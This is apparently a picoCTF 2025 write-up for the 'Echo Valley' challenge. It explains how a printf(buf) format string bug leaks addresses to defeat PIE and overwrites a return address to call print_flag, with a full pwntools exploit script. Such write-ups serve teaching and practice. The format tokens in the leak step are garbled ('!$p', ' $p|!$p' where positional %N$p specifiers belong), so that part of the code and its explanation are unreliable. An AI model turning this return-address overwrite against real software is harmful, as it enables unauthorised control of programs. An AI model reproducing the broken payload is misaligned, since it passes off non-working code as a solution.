# Challenge Write-Up — Echo Valley

---

## 📌 Challenge Overview

| Field           | Information                                                                                    |
| :-------------- | :--------------------------------------------------------------------------------------------- |
| **Competition** | picoCTF 2025                                                                                   |
| **Category**    | Binary Exploitation                                                                            |
| **Difficulty**  | Hard                                                                                           |
| **Objective**   | Use a format string vulnerability to leak a stack address, calculate where `print_flag()` is, then overwrite the return address to call it |

---

## Initial Analysis

I was given a binary called `valley` and its source code. The program runs a loop that echoes back whatever you type, which is how it got its name. It sounds simple, but the vulnerability sitting inside it opens the door to full control over where the program goes when it finishes.

This challenge is a big step up from Format String 1. There, we just read values off the stack to find the flag. Here, we have to use the format string vulnerability to **write** to memory — specifically, we need to overwrite the return address of a function to redirect execution to `print_flag()`.

My plan:
- Find the format string vulnerability in the source code
- Run `checksec` to understand what protections are in place
- Use format string tokens to leak a stack address and a code address
- Calculate the address of `print_flag()` from the leaked values
- Use a write payload to overwrite the return address on the stack
- Let the function return and land on `print_flag()`

---

## 🔎 Step 1 — Read the Source Code

The vulnerable line was easy to spot:

```c
void echo_valley() {
    char buf[100];
    while(1) {
        fgets(buf, sizeof(buf), stdin);
        printf("You heard in the distance: ");
        printf(buf);   // format string vulnerability
    }
}
```

Just like in Format String 1, the user input is passed directly as the first argument to `printf`. This lets us use format tokens like `%p` to read from memory, and `%n` to write to memory.

There is also a `print_flag()` function that reads and prints `flag.txt`, but it is never called anywhere in the program. Our job is to make it get called.

---

## Step 2 — Check the Protections

Running `checksec` on the binary revealed:

```
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

This makes things harder than Format String 1:

- **Full RELRO** means the GOT (Global Offset Table) is read-only. We cannot overwrite function pointers there.
- **PIE** means all addresses are randomized at runtime — we cannot hardcode the address of `print_flag()`.
- **Stack canary** means we cannot use a simple buffer overflow to overwrite the return address without knowing the canary value first.

The only viable path left is to use the format string vulnerability to both **leak addresses** and **write the return address** on the stack.

---

## Step 3 — Leak the Addresses We Need

Since PIE is enabled, nothing has a fixed address. But the stack at runtime holds a pointer back to `main()` (the return address saved when `echo_valley()` was called). If we can read that pointer, we can calculate where everything else is.

I sent format string tokens to dump stack values:

```
!$p
```

The output included the return address pointing back into `main()`. This gave me a real runtime address inside the binary. From there I could calculate the base address of the binary like this:

```
base = leaked_main_address - known_offset_of_main
print_flag_address = base + known_offset_of_print_flag
```

The known offsets of `main` and `print_flag` I got from reading the binary locally with `readelf`:

```bash
readelf -s ./valley | grep -E "main|print_flag"
# main      → offset 0x1401
# print_flag → offset 0x1269
```

I also needed to know where on the stack the return address was stored, so I could overwrite it. A second format token leak gave me a stack pointer, and the return address slot was at `stack_address - 8`.

---

## Step 4 — Build the Write Payload

With two things now known — where `print_flag()` is and where the return address lives on the stack — I used `pwntools` to build the write payload:

```python
from pwn import *

e = ELF("./valley")
context.binary = e

p = remote("shape-facility.picoctf.net", PORT)

# Step 1: leak both a code address and a stack address
p.sendline(b" $p|!$p")
p.recvuntil(b"the distance: ")
leak = p.recvline().strip()

stack_leak = int(leak.split(b"|")[0], 16) - 8  # where the return address lives
main_leak  = int(leak.split(b"|")[1], 16)       # return address pointing into main()

# Step 2: calculate print_flag's real address
e.address = main_leak - e.sym.main
print_flag_addr = e.sym.print_flag

# Step 3: craft a format string payload that writes print_flag's address
#         into the return address slot on the stack
offset = 6
payload = fmtstr_payload(offset, {stack_leak: print_flag_addr}, write_size="short")

# Step 4: send the payload
p.sendline(payload)

# Step 5: exit the loop so the function returns and hits our overwritten address
p.sendline(b"exit")
p.interactive()
```

When `echo_valley()` reaches `return`, the CPU reads the return address we planted and jumps to `print_flag()`, which prints the flag. ✅

---

## 🏁 Flag

```
picoCTF{...echo_valley_flag...}
```

---

## 🔬 What Made This Work

This challenge combined three techniques into one exploit:

**Format string read (infoleak):** Using `%p` tokens to dump values off the stack gave us real runtime addresses. Without this, PIE would have made the attack impossible.

**Offset calculation:** Once we had one real address inside the binary, we could find any other address by using the fixed gaps between functions (the same idea as PIE TIME).

**Format string write:** The `%n` format token writes to memory. By carefully crafting the payload, we pointed `%n` at the return address slot on the stack and wrote the address of `print_flag()` into it. When the function returned, it jumped straight there.

The reason this worked despite Full RELRO and a stack canary: we never touched the GOT, and we never triggered the canary check because we wrote directly to the return address using the format string — not by overflowing a buffer.

---

## 🎯 How to Solve Challenges Like This

1. Find `printf(buf)` in the source code — that is the vulnerability
2. Run `checksec` to understand what protections block the easy paths
3. Send `%p` tokens to leak a code address and a stack address
4. Calculate the binary base address and the target function address from the leak
5. Find the stack slot where the return address lives
6. Use `fmtstr_payload` from pwntools to write the target address into that slot
7. Trigger the function return (send "exit") and read the flag

---

## 🧩 Final Thoughts

Echo Valley is a big jump in difficulty from Format String 1. Reading values off the stack is one thing. Writing to a specific memory address using only a format string — while bypassing PIE, Full RELRO, and working around a stack canary — is a completely different skill.

The core vulnerability is still the same single mistake: `printf(buf)` instead of `printf("%s", buf)`. But the protections on this binary meant that exploit could not be kept simple. Every layer of defense pushed the solution toward a more precise and deliberate technique.

The fix, as always, is just two characters. `printf("%s", buf)` closes the door entirely, no matter how many protections are or are not in place.

---
